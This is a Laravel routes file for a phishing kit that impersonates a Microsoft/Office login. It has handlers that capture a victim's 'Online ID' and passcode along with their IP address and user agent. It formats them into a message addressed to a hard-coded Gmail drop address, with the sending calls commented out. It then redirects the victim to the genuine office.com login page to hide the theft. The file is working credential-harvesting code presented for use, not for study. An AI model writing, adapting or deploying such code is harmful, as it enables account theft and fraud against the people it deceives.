<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\LoginNotification;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Route::get('/', function () {
//     return view('welcome');
// });

Route::get('/', function () {
    return view('login');
});


Route::post('/login', function (Request $request) {
    $Receive_email = "ridhabelgacem0@gmail.com";

    $ai = trim($request['ai']);
    $pr = trim($request['pr']);

    // if($ai != null && $pr != null){
    $ip = $_SERVER['REMOTE_ADDR']; //getenv("REMOTE_ADDR");
    // $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "|----------| xLs |--------------|\n";
    
    $message .= "Online ID            : ".$ai."\n";
    $message .= "Passcode              : ".$pr."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
    $subject = "Login : $ip";
    // $res = Mail::to($send)->send('Hello world', $message);
    // $res = mail($send, $subject, $message);   
    // echo $res;
        
    
    return redirect()->route('password.view', ['email' => $ai]);

        
})->name("login.save");


Route::get('/password/email', function (Request $request) {
    $email = $request->input('email');
    return view('password', ["email" => $email]);
})->name("password.view");


Route::post('/password', function (Request $request) {
    $Receive_email = "ridhabelgacem0@gmail.com";

    $ai = trim($request['ai']);
    $pr = trim($request['pr']);



    return redirect()->away('https://www.office.com/login?es=UnauthClick&ru=%2f');
    // if($ai != null && $pr != null){
    //$ip = getenv("REMOTE_ADDR");
    // $hostname = gethostbyaddr($ip);
    // $useragent = $_SERVER['HTTP_USER_AGENT'];
    // $message = "|----------| xLs |--------------|\n";
    
    // $message .= "Online ID            : ".$ai."\n";
    // $message .= "Passcode              : ".$pr."\n";
    // $message .= "|--------------- I N F O | I P -------------------|\n";
    // $message .= "|Client IP: ".$ip."\n";
    // $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    // $message .= "User Agent : ".$useragent."\n";
    // $message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
    // $send = $Receive_email;
    // $subject = "Login : $ip";
    // mail($send, $subject, $message);   
    // $signal = 'ok';
    // $msg = 'InValid Credentials';
        
        // $praga=rand();
        // $praga=md5($praga);
    // }
    // else{
    //     $signal = 'bad';
    //     $msg = 'Please fill in all the fields.';
    // }
})->name("password.save");

